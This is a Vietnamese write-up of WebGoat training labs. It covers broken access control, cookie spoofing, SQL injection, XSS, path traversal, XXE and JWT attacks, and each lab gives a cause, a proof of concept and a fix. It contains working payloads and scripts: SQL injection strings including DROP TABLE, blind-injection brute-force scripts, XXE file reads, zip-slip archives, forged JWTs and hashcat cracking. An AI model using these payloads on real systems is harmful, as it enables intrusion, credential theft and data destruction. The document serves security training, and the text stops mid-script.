MessageDigest md = MessageDigest.getInstance(\u0026#34;SHA-256\u0026#34;); String salted = password + passwordSalt + username; byte[] hash = md.digest(salted.getBytes(StandardCharsets.UTF_8)); return Base64.getEncoder().encodeToString(hash); } } Mã hash mới thu được là: d4T2ahJN4fWP83s9JdLISio7Auh4mWhFT1Q38S6OewM= Cách khắc phục #\rKhông để các thông tin nhạy cảm như đường dẫn của admin ở giao diện của người dùng thường. Kiểm tra quyền của người dùng hiện tại mới cho phép sử dụng các tính năng đặc biệt. @PostMapping( path = {\u0026#34;access-control/users\u0026#34;, \u0026#34;access-control/users-admin-fix\u0026#34;}, consumes = \u0026#34;application/json\u0026#34;, produces = \u0026#34;application/json\u0026#34;) @ResponseBody public User addUser(@RequestBody User newUser) { try { var currentUser = userRepository.findByUsername(webSession.getUserName()); if (currentUser == null || !currentUser.isAdmin()) { return null; } userRepository.save(newUser); return newUser; } catch (Exception ex) { log.error(\u0026#34;Error creating new User\u0026#34;, ex); return null; } // @RequestMapping(path = {\u0026#34;user/{username}\u0026#34;,\u0026#34;/\u0026#34;}, method = RequestMethod.DELETE, consumes = // \u0026#34;application/json\u0026#34;, produces = \u0026#34;application/json\u0026#34;) // TODO implement delete method with id param and authorization } Spoofing an Authentication Cookie #\rNguyên nhân lỗi #\rThuật toán mã hóa và giải mã đơn giản, dễ dàng để có thể crack và tìm được thông điệp gốc ban đầu. Cụ thể, dev đơn giản tạo ra cookie mã dựa vào username + SALT (được tạo ngẫu nhiên thành sâu có 10 ký tự) → sau đó đảo ngược chuỗi này → chuyển thành mã hex → cuối cùng là mã hóa base64. Quá trình đảo ngược cũng tương tự. public static String encode(final String value) { if (value == null) { return null; } String encoded = value.toLowerCase() + SALT; encoded = revert(encoded); encoded = hexEncode(encoded); return base64Encode(encoded); } public static String decode(final String encodedValue) throws IllegalArgumentException { if (encodedValue == null) { return null; } String decoded = base64Decode(encodedValue); decoded = hexDecode(decoded); decoded = revert(decoded); return decoded.substring(0, decoded.length() - SALT.length()); } Dựa vào điều này, hacker có thể tạo ra một cookie hợp lệ của một người dùng nào đó từ username của họ và truy cập trái phép phiên đăng nhập của người dùng đó. POC #\rĐể truy cập vào tài khoản Tom thì cần tạo ra một cookie của tài khoản này. Code lại logic mã hóa của chương trình trên, sau đó truyền username là Tom vào để tạo ra được cookie. import org.apache.commons.lang3.RandomStringUtils; import org.springframework.security.crypto.codec.Hex; import java.nio.charset.StandardCharsets; import java.util.Base64; class SpoofCookie{ private static final String SALT = RandomStringUtils.randomAlphabetic(10); public static void main(String[] args){ String username = \u0026#34;tom\u0026#34;; String cookie = encode(username); System.out.println(cookie); } public static String encode(final String value) { if (value == null) { return null; } String encoded = value.toLowerCase() + SALT; encoded = revert(encoded); encoded = hexEncode(encoded); return base64Encode(encoded); } private static String revert(final String value) { return new StringBuilder(value).reverse().toString(); } private static String hexEncode(final String value) { char[] encoded = Hex.encode(value.getBytes(StandardCharsets.UTF_8)); return new String(encoded); } private static String base64Encode(final String value) { return Base64.getEncoder().encodeToString(value.getBytes()); } } Chạy code trên và nhận được cookie NGY0NDc5NmE1MjZlNTM3MDQ1NzM2ZDZmNzQ= , gán cookie này sau đó Access thì sẽ có được truy cập bằng tài khoản Tom → pass được assign này. Cách khắc phục #\rThay cách mã hóa tự tạo này thành một phương thức mã hóa bảo mật hơn như Json Web Token. (A2) Cryptography Failures #\rLab 2 #\rGiải mã base64 của c2hyM3dkOmFkbWlu thì thu được tài khoản và password Lab 3 #\rSử dụng trang sau để decode https://strelitzia.net/wasXORdecoder/wasXORdecoder.html Lab 4 #\rSử dụng trang https://hashes.com/en/decrypt/hash hoặc https://crackstation.net/ để crack các mã hash này Lab 5 #\rCopy private key vào một file Sau đó dùng openssl (A3) Injection\n(A3) Injection #\rSQL Injection (Intro) #\rLab 9 #\rĐể lấy được tất cả dữ liệu trong bảng thì chỉ cần làm logic query thành một query luôn đúng SELECT * FROM user_data WHERE first_name = \u0026#39;John\u0026#39; AND last_name = ‘’ or ‘1’=’1’ Lab 10 #\rĐể lấy được tất cả dữ liệu trong bảng thì chỉ cần làm logic query thành một query luôn đúng SELECT * FROM user_data WHERE login_count = 0 AND userid = 0 or 1 = 1 Lab 11 #\rPayload SELECT * FROM employees WHERE last_name = \u0026#39;\u0026#39; or 1=1 -- AND auth_tan = \u0026#39;\u0026#39; Lab 12 #\rĐể bypass lab này thì cần phải update giá trị lương của Smith, lúc này phải sử dụng Query Chain để chèn câu lệnh update vào sau câu lệnh select Payload Employee Name: \u0026lt;Anything\u0026gt; Authentication TAN: \u0026#39;; UPDATE employees SET salary = 1000000 WHERE userid = \u0026#39;37648 Lab 13 #\rPayload Action contains: \u0026#39;; DROP TABLE access_log -- SQL Injection (advanced) #\rLab 3 #\rNguyên nhân lỗi #\rSử dụng untrust data nhập từ người dùng accountName để chèn chuỗi trực tiếp vào câu truy vấn SQL. public AttackResult injectableQuery(String accountName) { String query = \u0026#34;\u0026#34;; try (Connection connection = dataSource.getConnection()) { boolean usedUnion = true; query = \u0026#34;SELECT * FROM user_data WHERE last_name = \u0026#39;\u0026#34; + accountName + \u0026#34;\u0026#39;\u0026#34;; POC #\rĐầu tiên sử dụng payload ' or '1'='1 để xem toàn bộ dữ liệu trong bảng user_data Sử dụng UNION để có thể xem được dữ liệu từ bảng user_system_data \u0026#39; UNION SELECT userid as user_system_id, user_name, password, cookie, \u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,1 FROM user_system_data -- Password của Dave là passW0rD Cách khắc phục #\rSử dụng PreparedStatement Lab 5 #\rNguyên nhân lỗi #\rChèn trực tiếp giá trị vào câu query dẫn đến bị tấn công SQL Injection POC #\rTừ lỗ hổng SQL Injection này, có thể bruteforce để tìm ra từng ký tự trong mật khẩu của người dùng Tom from requests import post, put import json URL = \u0026#34;http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge\u0026#34; letters = [chr(i) for i in range(97, 123)] numbers = [str(i) for i in range(10)] letters += numbers password = \u0026#34;\u0026#34; while True: for char in letters: headers = { \u0026#39;Cookie\u0026#39;: \u0026#39;JSESSIONID=50WEjJp0KpMHh8QPjanNPieKQi_ZGTnt66PK1FQP\u0026#39; } payload = f\u0026#34;tom\u0026#39; AND password LIKE \u0026#39;{password + char}%\u0026#39; --\u0026#34; data = { \u0026#34;username_reg\u0026#34;: payload, \u0026#34;email_reg\u0026#34;: \u0026#34;a@a.com\u0026#34;, \u0026#34;password_reg\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;confirm_password_reg\u0026#34;: \u0026#34;a\u0026#34; } response = put(URL, data=data, headers=headers) if \u0026#34;already exists\u0026#34; in response.text: password += char print(password) break Chạy chương trình trên, và nó sẽ dò ra được password của tài khoản Tom Password của Tom là thisisasecretfortomonly , đăng nhập với password này thì thành công. Cách khắc phục #\rSử dụng PreparedStatement thay vì Statement để thực hiện các truy vấn SQL với các tham số đầu vào được định dạng an toàn. try (Connection connection = dataSource.getConnection()) { String checkUserQuery = \u0026#34;select userid from sql_challenge_users where userid = ?\u0026#34;; PreparedStatement statement = connection.prepareStatement(checkUserQuery); statement.setString(1, username_reg); ResultSet resultSet = statement.executeQuery(); if (resultSet.next()) { if (username_reg.contains(\u0026#34;tom\u0026#39;\u0026#34;)) { attackResult = success(this).feedback(\u0026#34;user.exists\u0026#34;).build(); } else { attackResult = failed(this).feedback(\u0026#34;user.exists\u0026#34;).feedbackArgs(username_reg).build(); } } else { PreparedStatement preparedStatement = connection.prepareStatement(\u0026#34;INSERT INTO sql_challenge_users VALUES (?, ?, ?)\u0026#34;); preparedStatement.setString(1, username_reg); preparedStatement.setString(2, email_reg); preparedStatement.setString(3, password_reg); preparedStatement.execute(); attackResult = success(this).feedback(\u0026#34;user.created\u0026#34;).feedbackArgs(username_reg).build(); } } catch (SQLException e) { attackResult = failed(this).output(\u0026#34;Something went wrong\u0026#34;).build(); } SQL Injection (mitigation) #\rLab 9 #\rNguyên nhân lỗi #\rLập trình viên chỉ đơn giản là validate input, nếu có white space thì trả failed về cho phía Client POC #\rCó thể sử dụng /**/ để thay thế cho white space Payload \u0026#39;/**/SELECT/**/*/**/FROM/**/user_system_data;/**/-- Lab 10 #\rNguyên nhân lỗi #\rVẫn sử dụng filter white space và kết hợp thêm filter đi 2 từ SELECT và FROM Tuy nhiên, phần filter SELECT và FROM chỉ đơn giản là thay thế một lần và thay bằng một chuỗi rỗng “” → Nếu truyền SSELECTELECT thì khi filter thì nó sẽ trở thành SELECT, tương tự với FROM → Vẫn bị tấn công SQL Injection Về phần filter white space thì nó giống như Lab 9 POC #\rSử dụng payload bên dưới để bypass \u0026#39;/**/SESELECTLECT/**/*/**/FRFROMOM/**/user_system_data;/**/-- Lab 12 #\rSử dụng script python sau import requests index = 0 headers = { \u0026#39;Cookie\u0026#39;: \u0026#39;JSESSIONID=1JeQYvZuQvFhvbBcInM3sY6E0dKFHFK9m0Hg7RkA\u0026#39; } while True: payload = \u0026#39;(CASE WHEN (SELECT ip FROM servers WHERE hostname=\\\u0026#39;webgoat-prd\\\u0026#39;) LIKE \\\u0026#39;{}.%\\\u0026#39; THEN id ELSE hostname END)\u0026#39;.format(index) r = requests.get(\u0026#39;http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=\u0026#39; + payload, headers=headers) try: response = r.json() except: print(\u0026#34;Wrong JSESSIONID, find it by looking at your requests once logged in.\u0026#34;) break print(response) if response[0][\u0026#39;id\u0026#39;] == \u0026#39;1\u0026#39;: print(\u0026#39;webgoat-prd IP: {}.130.219.202\u0026#39;.format(index)) break else: index += 1 if index \u0026gt; 255: print(\u0026#34;No IP found\u0026#34;) break Chạy script trên và lấy được ip Cross Site Scripting #\rLab 7 #\rNguyên nhân lỗi #\rLập trình viên nhận input được nhập từ người dùng và chèn thẳng vào đoạn mã html để trả về cho phía Client mà không có một biện pháp ngăn chặn lỗ hổng XSS. POC #\rNhư ở đoạn code trên, thì field1 chính là nơi dẫn đến lỗ hổng XSS. Chèn một đoạn script để active XSS ở phía Client như bên dưới \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; Cách khắc phục #\rValidate đầu vào dữ liệu để khó bị tấn công XSS hơn. if (XSS_PATTERN.test(field1) || XSS_PATTERN.test(field2)) { return failed(this).feedback(\u0026#34;xss-reflected-5a-failed-wrong-field\u0026#34;).build(); } Cross Site Scripting (stored) #\rNguyên nhân lỗi #\rTương tự như Lab 7 của Cross Site Scripting, nguyên nhân dẫn đến lỗi là dữ liệu từ người dùng không được filter mà được lưu trữ trực tiếp sau đó hiển thị trực tiếp ra → Khiến cho kẻ tấn công có thể chèn được payload XSS POC #\rSử dụng payload sau để chạy được *webgoat.customjs.phoneHome* \u0026lt;script\u0026gt;webgoat.customjs.phoneHome()\u0026lt;/script\u0026gt; Mở Dev Tool của browser lên thì sẽ thấy được kết quả của function phoneHome Path Traversal #\rLab 2 #\rNguyên nhân lỗi #\rĐầu vào dữ liệu từ phía Client được sử dụng trực tiếp để chèn vào trong việc tạo tên file, điều này khiến cho hacker có thể chèn payload vào fullName để thực hiện viẹc thay đổi đường dẫn lưu trữ file. POC #\rThực hiện việc upload file và bắt request này lại Ở dữ liệu trả về đã hiển thị đường dẫn lưu trữ file. Và nhiệm vụ của chúng ta là ghi file vào đường dẫn /home/webgoat/.webgoat-2023.8/PathTraversa Lúc này chỉ cần thay đổi dữ liệu ở trường fullName thành ../test rồi send request Lab 3 #\rNguyên nhân lỗi #\rNguyên nhân gây lỗi vẫn như lab trên, tuy nghiên chuỗi ký tự ../ đã bị filter và thay thế thành chuỗi rỗng “” → Tuy nhiên khi filter bằng cách này, attacker có thể chèn chuỗi ….// để khi bị filter thì nó sẽ trở lại thành ../ POC #\rThực hiện như các bước ở Lab 2 Thay đổi giá trị trường fullName thành ….//test Lab 4 #\rNguyên nhân lỗi #\rỞ trong lab này, thay vì nguyên nhân gây lỗi đến từ fullName thì nó lại đến từ tên của file được upload. → Chỉ cần thay đổi tên file là có thể thực hiện tấn công path traversal POC #\rTương tự như các bước ở lab trên. Thay đổi filename thành payload ../image.jpg và send request Lab 5 #\rNguyên nhân lỗi #\rLập trình viên tuy đã filter input từ phía Client các ký tự được sử dụng hay dùng để tấn công Path Traversal là .. và / . Tuy nhiên, bằng cách encode URL đi các ký tự này thì có thể bypass được cách filter này của lập trình viên. POC #\rGửi một yêu cầu để lấy một ảnh Random thì phát hiện kết quả được trả về được lấy từ Location /PathTraversal/random-picture?id=3.jpg Đây chính là nơi bị Path Traversal, thay đổi id thành %2e%2e%2f sau đó gửi request thì không bị filter nữa và hiển thị danh sách các file. Với payload %2e%2e%2f%2e%2e%2f thì có thể tìm thấy được file cần tìm path-traversal-secret.jpg Dùng payload %2e%2e%2f%2e%2e%2fpath-traversal-secret để đọc file này. Lab 7 #\rNguyên nhân lỗi #\rKhi giải nén file thì không kiểm tra kỹ tên file, điều này khiến cho kẻ tấn công có thể thay đổi tên file nén → dẫn đến có thể kiểm soát được đường dẫn mà file giải nén được giải nén. POC #\rTạo một đường dẫn muốn tấn công trên máy attack, ở đây là /home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd/shr3wd.jpg mkdir /home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd cd /home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd file shr3wd.jpg Sau đó nén file với đường dẫn này zip evil.zip ../../../../../../../../home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd/shr3wd.jpg Upload file evil.zipnày lên để bypass được Cách khắc phục #\rtry { Path uploadedZipFile = tmpZipDirectory.resolve(file.getOriginalFilename()); FileCopyUtils.copy(file.getBytes(), uploadedZipFile.toFile()); try (ZipFile zip = new ZipFile(uploadedZipFile.toFile())) { Enumeration\u0026lt;? extends ZipEntry\u0026gt; entries = zip.entries(); while (entries.hasMoreElements()) { ZipEntry e = entries.nextElement(); Path resolvedPath = tmpZipDirectory.resolve(e.getName()).normalize(); if (!resolvedPath.startsWith(tmpZipDirectory)) { throw new IOException(\u0026#34;Zip entry is outside of the target directory: \u0026#34; + e.getName()); } if (e.isDirectory()) { Files.createDirectories(resolvedPath); } else { Files.createDirectories(resolvedPath.getParent()); try (InputStream is = zip.getInputStream(e)) { Files.copy(is, resolvedPath, StandardCopyOption.REPLACE_EXISTING); } } } } return isSolved(currentImage, getProfilePictureAsBase64()); } catch (IOException e) { return failed(this).output(\u0026#34;An error occurred during file processing.\u0026#34;).build(); } (A5) XXE #\rXXE 4 #\rNguyên nhân lỗi #\rLập trình viên không kiểm tra đầu vào của xml Không tắt tính năng Document Type Definition (DTD), khiến cho kẻ tấn công có thể injection vào XML bằng cách chèn DTD. // ... protected Comment parseXml(String xml) throws XMLStreamException, JAXBException { var jc = JAXBContext.newInstance(Comment.class); var xif = XMLInputFactory.newInstance(); if (webSession.isSecurityEnabled()) { xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \u0026#34;\u0026#34;); // Compliant xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \u0026#34;\u0026#34;); // compliant } var xsr = xif.createXMLStreamReader(new StringReader(xml)); var unmarshaller = jc.createUnmarshaller(); return (Comment) unmarshaller.unmarshal(xsr); } // ... POC #\rBắt một request khi gửi Review Thêm DTD vào phần xml của request để có thể đọc được file /etc/passwd \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE text [ \u0026lt;!ENTITY payload SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;text\u0026gt;\u0026amp;payload;\u0026lt;/text\u0026gt; \u0026lt;/comment\u0026gt; Gửi request đi Cách khắc phục #\rKiểm tra lại input XML được gửi đến từ phía client để xem có bị tấn công XXE hay không Tắt tính năng DTD của XML protected Comment parseXml(String xml) throws XMLStreamException, JAXBException { var jc = JAXBContext.newInstance(Comment.class); var xif = XMLInputFactory.newInstance(); xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \u0026#34;\u0026#34;); // Compliant xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \u0026#34;\u0026#34;); // compliant xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); // Disable DTDs entirely xif.setProperty(\u0026#34;javax.xml.stream.isSupportingExternalEntities\u0026#34;, false); // Prevent external entities var xsr = xif.createXMLStreamReader(new StringReader(xml)); var unmarshaller = jc.createUnmarshaller(); return (Comment) unmarshaller.unmarshal(xsr); } XXE 7 #\rNguyên nhân lỗi #\rLập trình viên sử dụng cả 2 Content-Type là application/json và application/xml cho dữ liệu được gửi đến từ phía Client. Tuy nhiên khi xử lý Content-Type là application/xml, thì lập trình viên lại mắc phải lỗi như XXE 1 POC #\rBắt một request khi gửi Review. Lúc này Content-Type là application/json Đổi Content-Type thành application/xml , và Body thành xml như dưới \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE text [ \u0026lt;!ENTITY payload SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;text\u0026gt;\u0026amp;payload;\u0026lt;/text\u0026gt; \u0026lt;/comment\u0026gt; Send request và bypass Cách khắc phục #\rNhư của XXE 4 XXE 11 #\rNguyên nhân lỗi #\rNguyên nhân chính dẫn đến lỗi vẫn như 2 lab trên, tuy nhiên ở lab này có thêm logic để không hiển thị nội dung file cần đọc nếu như phát hiện “nội dung của file cần đọc có chứa nội dung của comment” Chính việc so sánh này dẫn đến việc hacker có thể chèn thêm một nội dung trong payload tấn công XXE để nó không là chuỗi con của file cần đọc và có thể bypass được logic này. Comment comment = comments.parseXml(commentStr); if (fileContentsForUser.contains(comment.getText())) { comment.setText(\u0026#34;Nice try, you need to send the file to WebWolf\u0026#34;); } comments.addComment(comment, false); POC #\rTạo một file DTD có nội dung bên dưới và upload lên WebWolf để host. DTD này có nhiệm vụ là sẽ đọc nội dung file secret.txt và lưu trữ vào entity secret. Bắt Request và injection payload XXE như bên dưới Entity blindxxe được sử dụng để inject dtd ở phía trên đang được host ở WebWolf - Chính là nội dung file cần đọc đã được lưu trong entity secret . Lúc này chỉ cần chèn thêm một chuỗi bất kỳ để nội dung được gửi đến server sẽ không là chuỗi con của nội dung file secret.txt. \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE xxe [ \u0026lt;!ENTITY % blindxxe SYSTEM \u0026#34;http://localhost:9090/WebWolf/files/shr3wd/test4.dtd\u0026#34;\u0026gt; %blindxxe; ]\u0026gt; \u0026lt;comment\u0026gt;\u0026lt;text\u0026gt;secret \u0026amp;secret;\u0026lt;/text\u0026gt;\u0026lt;/comment\u0026gt; Gửi request và reload lại trang để đọc được nội dung của file trong phần comment. (A6) Vulnerable Components #\r(A7) Identity \u0026amp; Auth Failure #\rAuthentication Bypasses #\rNguyên nhân lỗi #\rLập trình viên mắc phải lỗi trong việc xây dựng logic kiểm tra câu hỏi bảo mật public boolean verifyAccount(Integer userId, HashMap\u0026lt;String, String\u0026gt; submittedQuestions) { // short circuit if no questions are submitted if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) { return false; } if (submittedQuestions.containsKey(\u0026#34;secQuestion0\u0026#34;) \u0026amp;\u0026amp; !submittedQuestions .get(\u0026#34;secQuestion0\u0026#34;) .equals(secQuestionStore.get(verifyUserId).get(\u0026#34;secQuestion0\u0026#34;))) { return false; } if (submittedQuestions.containsKey(\u0026#34;secQuestion1\u0026#34;) \u0026amp;\u0026amp; !submittedQuestions .get(\u0026#34;secQuestion1\u0026#34;) .equals(secQuestionStore.get(verifyUserId).get(\u0026#34;secQuestion1\u0026#34;))) { return false; } // else return true; } Ở đây, lập trình viên chỉ kiểm tra khi mà trong danh sách các câu hỏi có secQuestion0 và secQuestion1 , có nghĩa nếu không có 2 câu hỏi trên thì giá trị trả về của hàm verifyAccount luôn là True POC #\rBắt một request và gửi nó đến Repeater Thay đổi secQuestion0 thành secQuestion2 và secQuestion1 thành secQuestion3 rồi gửi request Cách khắc phục #\rThay đổi logic kiểm tra public boolean verifyAccount(Integer userId, HashMap\u0026lt;String, String\u0026gt; submittedQuestions) { // short circuit if no questions are submitted bool check = false; if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) { return false; } if ((submittedAnswers.containsKey(\u0026#34;secQuestion0\u0026#34;) \u0026amp;\u0026amp; submittedAnswers .get(\u0026#34;secQuestion0\u0026#34;) .equals(secQuestionStore.get(verifyUserId).get(\u0026#34;secQuestion0\u0026#34;))) \u0026amp;\u0026amp; (submittedAnswers.containsKey(\u0026#34;secQuestion1\u0026#34;) \u0026amp;\u0026amp; submittedAnswers .get(\u0026#34;secQuestion1\u0026#34;) .equals(secQuestionStore.get(verifyUserId).get(\u0026#34;secQuestion1\u0026#34;)))) { check = true; } return check; } Insecure Login #\rKhi nhấn vào nút Log in và bắt lại request thì nhận được một credential như sau {\u0026#34;username\u0026#34;:\u0026#34;CaptainJack\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;BlackPearl\u0026#34;} Dùng thông tin này để đăng nhập vào để bypass JWT tokens #\rLab 4 #\rSử dụng tính năng JWT trong WebWolf để decode token này và thu được username là: user Lab 6 #\rNguyên nhân lỗi #\rLập trình viên không kiểm tra tính toàn vẹn của token khi nhận được từ phía client, mà chỉ giải mã sau đó lấy phần body để xử lý tiếp các logic khác. Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken); Claims claims = (Claims) jwt.getBody(); String user = (String) claims.get(\u0026#34;user\u0026#34;); if (\u0026#34;Guest\u0026#34;.equals(user) || !validUsers.contains(user)) { value.setSerializationView(Views.GuestView.class); } else { value.setSerializationView(Views.UserView.class); } Điều này khiến cho token có thể bị thay đổi và dữ liệu có thể thay đổi, khiến cho hacker có thể dễ dàng chiếm quyền và thay đổi thông tin để thực hiện các biện pháp tấn công khác. POC #\rĐổi sang một người dùng khác thì sẽ nhận được một access_token, parse nó vào JWT của WebWolf Thay đổi alg thành none và admin thành true . Sau đó copy mã token mới được tạo lại eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE3MjQ0MDUyMjMsDQogICJ1c2VyIiA6ICJUb20iDQp9. Thay mã token này vào, rồi thực hiện request đến /votings Cách khắc phục #\rXác thực lại tính toàn vẹn của token try { Jwt\u0026lt;Claims\u0026gt; jwt = Jwts.parserBuilder() .setSigningKey(JWT_PASSWORD) .build() .parseClaimsJws(accessToken); Claims claims = jwt.getBody(); String user = claims.get(\u0026#34;user\u0026#34;, String.class); if (\u0026#34;Guest\u0026#34;.equals(user) || !validUsers.contains(user)) { value.setSerializationView(Views.GuestView.class); } else { value.setSerializationView(Views.UserView.class); } } catch (JwtException e) { logger.error(\u0026#34;JWT parsing error: \u0026#34;, e); value.setSerializationView(Views.GuestView.class); } Lab 11 #\rSử dụng tool hashcat để crack token này hashcat token -m 16500 -a 3 -w 3 /usr/share/wordlist/rockyou.txt → Tìm được key là washington\nĐưa token gốc vào JWT của WebGoat, sau đó dán key vào để lấy được token mới. Send token này và bypass lab này. Lab 13 #\rĐể bypass được bài này có thể sử dụng cách như Lab 6 để chỉnh sửa token được ghi lại trong log.\nNguyên nhân lỗi #\rKhông kiểm tra refreshToken có phải là refreshToken của người dùng cần thực hiện hành vi làm mới token không. Điều này khiến cho hacker có thể sử dụng một refreshToken hợp lệ nhưng của một người dùng khác để thực hiện việc cấp lại access_token của tài khoản target. try { Jwt\u0026lt;Header, Claims\u0026gt; jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace(\u0026#34;Bearer \u0026#34;, \u0026#34;\u0026#34;)); user = (String) jwt.getBody().get(\u0026#34;user\u0026#34;); refreshToken = (String) json.get(\u0026#34;refresh_token\u0026#34;); } catch (ExpiredJwtException e) { user = (String) e.getClaims().get(\u0026#34;user\u0026#34;); refreshToken = (String) json.get(\u0026#34;refresh_token\u0026#34;); } if (user == null || refreshToken == null) { return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); } else if (validRefreshTokens.contains(refreshToken)) { validRefreshTokens.remove(refreshToken); return ok(createNewTokens(user)); } else { return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); } POC #\rKhi đăng nhập thì access_token và refresh_token sẽ được khởi tạo cho người dùng bằng hàm createNewTokens . Trong hàm này refreshToken khi được khởi tạo sẽ được lưu vào mảng *validRefreshTokens .* Mảng này sẽ được sử dụng để kiểm tra refreshToken có hợp lệ không khi thực hiện việc làm mới - cấp lại access_token . Lúc này, chỉ cần đăng nhập bằng tài khoản Jerry để lấy được refreshToken và để lưu nó và trong mảng validRefrshTokens → phục vụ cho việc attack cấp lại accessToken cho người dùng Tom. Thực hiện request đến /newToken cùng với refresh_token trên, cùng với token trên header Authorization đã được thay đổi để user thành Tom để lấy được access_tokenmới của tài khoản Tom . Ở đây, logic code lại mắc phải lỗi đơn giản chỉ lấy data từ phần body của json web token mà không kiểm tra tính hợp lệ của token này → Điều này khiến cho việc giả mạo token để thay đổi trường data user vẫn có thể xảy ra (Tương tự như Lab 6)\nThay đổi user thành Tom\nThực hiện việc tạo mới access_token của user Tom\nLấy access_token mới này thay thế cho token của Jerry ở phần header Authorization và thực hiện gửi request. Cách khắc phục #\rKiểm tra refresh_token có hợp lệ hay không, có phải token thuộc về người dùng thực hiện việc yêu cầu cấp access_token mới\nỞ trong đoạn code này, có thể thay đổi *validRefreshTokens* thành kiểu HashMap. Thực hiện việc xác định tính hợp lệ của access_tokenở đoạn code này Lab 16 #\rNguyên nhân lỗi #\rViệc trích xuất URL jku từ header của token và sử dụng nó để tạo JwkProvider là rất nguy hiểm. Điều này cho phép kẻ tấn công đưa URL độc hại vào jku, từ đó có thể thực hiện các tấn công thay đổi jku để có thể xác thực mã token POC #\rGửi một request thực hiện việc xóa user Tom và bắt request này lại Ở đây đường dẫn bị sai, chỉnh final thành jku . Có thể thấy được có một mã token được gửi kèm trong request Dùng JWT của WebWolf để phân tích token này Ở đây chúng ta sẽ đổi jku thành một địa chỉ mà chúng ta host file jwks.json (Dùng WebWolf để host file này), username đổi thành Tom và chỉnh exp thành một ngày hợp lệ. Sử dụng một tool để tạo token mới dựa vào jku mới - https://github.com/ticarpi/jwt_tool python jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vd2ViZ29hdC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJ0eXAiOiJKV1QifQ.ew0KICAiRW1haWwiIDogImplcnJ5QHdlYmdvYXQuY29tIiwNCiAgIlJvbGUiIDogWyAiQ2F0IiBdLA0KICAiYXVkIiA6ICJ3ZWJnb2F0Lm9yZyIsDQogICJleHAiIDogMTgxODkwNTMwNCwNCiAgImlhdCIgOiAxNTI0MjEwOTA0LA0KICAiaXNzIiA6ICJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLA0KICAic3ViIiA6ICJqZXJyeUB3ZWJnb2F0LmNvbSIsDQogICJ1c2VybmFtZSIgOiAiVG9tIg0KfQ. -X s -ju http://127.0.0.1:9090/WebWolf/files/shr3wd/jwks.json Sau khi chạy có một file jwks.json cũng được tạo ra, upload nó lên WebWolf để host. Copy token vừa được gen và thay vào rồi gửi request Cách khắc phục #\rKiểm tra JKU có nằm trong whitelist được cho phép hay không thì mới thực hiện việc kiểm tra Lab 18 #\rNguyên nhân lỗi #\rKID được lấy từ token được chèn thẳng vào trong câu lệnh SQL, điều này khiến cho việc kẻ tấn công có thể chèn payload để thực hiện SQL Injection Kết hợp lỗi SQL Injection có thể giả mạo một KID hợp lệ - mặc dù key không tồn tại trong database POC #\rThực hiện bắt một request delete tài khoản Tom, nó sẽ có một Token được gửi kèm như Lab 16. Sử dụng JWT trong WebGoat để phân tích Token này. Đổi trường username thành Tom, exp thành một giá trị hợp lệ (Lớn hơn ngày hiện tại) Đổi giá trị của trường kid thành payload để thực hiện SQL Injection giả mạo một key hợp lệ (Key ở đây sẽ chọn ngẫu nhiên - ở đây sẽ là key và key này sẽ được mã hóa base64 như logic của đoạn code) qwert\u0026#39; UNION SELECT \u0026#39;a2V5\u0026#39; FROM INFORMATION_SCHEMA.SYSTEM_TABLES; — Sau đó điền vào secret giá trị là key mà mình chọn - key Thay token mới này và thực hiện request và bypass được. Cách khắc phục #\rSử dụng Prepared Statements để thay thế cho việc truyền tham số vào trực tiếp như trên để phòng chống SQL Injection public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) { final String kid = (String) header.get(\u0026#34;kid\u0026#34;); String query = \u0026#34;SELECT key FROM jwt_keys WHERE id = ?\u0026#34;; try (var connection = dataSource.getConnection(); PreparedStatement preparedStatement = connection.prepareStatement(query)) { preparedStatement.setString(1, kid); try (ResultSet rs = preparedStatement.executeQuery()) { if (rs.next()) { return TextCodec.BASE64.decode(rs.getString(\u0026#34;key\u0026#34;)); } } } catch (SQLException e) { errorMessage[0] = e.getMessage(); } return null; } Password Reset #\rLab 4 #\rNguyên nhân lỗi #\rCâu hỏi bảo mật quá dễ đoán, có thể bruteforce để tìm được. POC #\rĐể bruteforce nhanh hơn, code một đoạn code python như bên dưới. import requests colors = [\u0026#34;red\u0026#34;, \u0026#34;blue\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;brown\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;white\u0026#34;, 